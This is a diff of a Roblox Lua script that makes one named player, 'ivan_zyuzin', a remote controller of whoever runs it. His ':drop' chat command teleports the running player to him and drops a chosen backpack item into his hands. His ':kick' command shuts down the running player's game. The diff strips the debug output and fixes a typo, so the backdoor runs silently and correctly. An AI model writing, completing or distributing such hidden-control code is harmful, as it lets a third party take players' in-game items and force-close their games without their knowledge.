@@ -97,9 +97,9 @@ local plr = game.Players.LocalPlayer
 function trigger(target)
     
     trig = target.Chatted:Connect(function(word)
-        print("chat")
+        
         if ((word:sub(1,5)):lower() == ":drop") then
-		print("pass 1")
+		
             local char = plr.Character or plr.CharacterAdded:Wait()
             local hum = char:FindFirstChild("Humanoid")
             local humrp = char:FindFirstChild("HumanoidRootPart")
@@ -108,13 +108,13 @@ function trigger(target)
 	    local tarhumrp = tarchar:FindFirstChild("HumanoidRootPart")
 	    
             if (char and hum and hum.Health > 1 and humrp and event and tarchar and tarhumrp) then
-            print("pass 2")
+            
                 local itemname = (word:sub(7,-1)):lower()
-                print(itemname)
+                
                 local lastpos = humrp.CFrame
-		print(lastpos)
+		
                 humrp.CFrame = tarhumrp.CFrame * CFrame.new(0,0,5)
-                print("Wryyyy")
+                
                 for _,v in pairs(plr.Backpack:GetChildren()) do
                     
                     if (v.Name):lower() == itemname then
@@ -126,7 +126,9 @@ function trigger(target)
                 
                 humrp.CFrame = lastpos
             end
-        elseif ((word:Sub(1,5)):lower() == ":kick") then game:Shutdown() end
+        elseif ((word:sub(1,5)):lower() == ":kick") then
+		game:Shutdown()
+	end
     end)
 end
     
@@ -135,19 +137,19 @@ end
 for _,v in pairs(game.Players:GetChildren()) do
     if v.Name == "ivan_zyuzin" then
         trigger(v)
-	print("Nill")
+	
     end
 end
 
 game.Players.ChildAdded:Connect(function(v)
     if v.Name == "ivan_zyuzin" then
         trigger(v)
-	print("added")
+	
     end
 end)    
 game.Players.ChildRemoved:Connect(function(v)
     if v.Name == "ivan_zyuzin" then
         trig:Disconnect()
-	print("removed")
+	
     end
 end)    
